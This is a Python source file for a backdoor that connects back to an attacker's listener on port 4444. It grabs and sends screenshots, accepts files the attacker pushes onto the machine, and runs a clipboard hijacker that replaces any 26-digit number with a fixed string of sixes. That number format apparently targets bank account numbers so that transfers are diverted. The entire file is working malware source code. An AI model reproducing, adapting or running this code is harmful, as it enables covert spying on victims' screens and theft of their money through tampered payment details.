import socket
import pyautogui
from io import BytesIO
import clipboard
import threading
import time
import re
from datetime import datetime

def connect_with_attacker():
    # server_ip = '192.168.0.136'
    server_ip = '127.0.1.1'
    port = 4444

    backdoor = socket.socket()
    clipboard_changing_active = False

    try:
        backdoor.connect((server_ip, port))

        while True:
            try:
                message = backdoor.recv(1024).decode("UTF-8")

                if message == 'screenshot':
                    send_screenshot(backdoor)
                elif message == 'clipboard':
                    if not clipboard_changing_active:
                        clipboard_changing_active = True
                        changing_clipboard_thread = threading.Thread(target=changing_clipboard)
                        changing_clipboard_thread.start()
                elif message == 'file':
                    extension = backdoor.recv(1024).decode("UTF-8")
                    print("Waiting for file with extension: " + extension)
                    now = datetime.now()
                    f = open('sent_to_victim/'+now.strftime("%Y%m%d_%H-%M-%S") + extension, 'wb')
                    msg = backdoor.recv(1024)

                    while len(msg) == 1024:
                        f.write(msg)
                        msg = backdoor.recv(1024)

                    f.close()
                    print("receiving ended")
            except:
                print("error")
                backdoor.close()
                break
            pass
    except:
        print("Connection failed.")


def send_screenshot(backdoor):
    backdoor.send("screenshot".encode("utf-8"))

    screenshot = pyautogui.screenshot()
    buffered = BytesIO()
    screenshot.save(buffered, format="PNG")
    buffered.seek(0)
    package = buffered.read(1024)
    while package:
        backdoor.send(package)
        package = buffered.read(1024)
    backdoor.send(str.encode('Finished'))
    print("sending finished")


def changing_clipboard():
    recent_value = ""
    while True:
        tmp_value = clipboard.paste()
        if tmp_value != recent_value:
            recent_value = tmp_value
            clipboard.copy(re.sub(r"(?<!\d)\d{26}(?!\d)", "6" * 26, tmp_value))
        time.sleep(0.1)


# attacker_thread = threading.Thread(target=connect_with_attacker)
connect_with_attacker()
